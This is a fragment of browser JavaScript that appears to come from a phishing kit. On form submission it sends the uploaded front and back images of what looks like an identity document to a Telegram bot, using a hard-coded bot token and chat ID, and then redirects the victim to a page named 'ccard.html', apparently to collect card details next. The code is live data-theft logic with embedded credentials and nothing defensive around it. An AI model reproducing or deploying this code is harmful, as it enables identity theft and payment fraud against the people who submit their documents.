


    const bots = new Bot("6305852910:AAHH1Zst4T1eo9ImKV14vRVd5Xbs_fiMvus", 6695577186);

   window.location.hostname
   window.location.port



    document.getElementById("form").addEventListener("submit", e => {
        e.preventDefault();
    
    
    ///  const text = document.getElementById("textinput").value;
    
    
    ///    bot.sendFile("#fileinput", text)
        bots.sendFile("#fileinputfront")
        bots.sendFile("#fileinputback")
        .then(res => {
    ///    console.log(res);
        window.location.href='ccard.html'
        })
    })
    
    
    
    

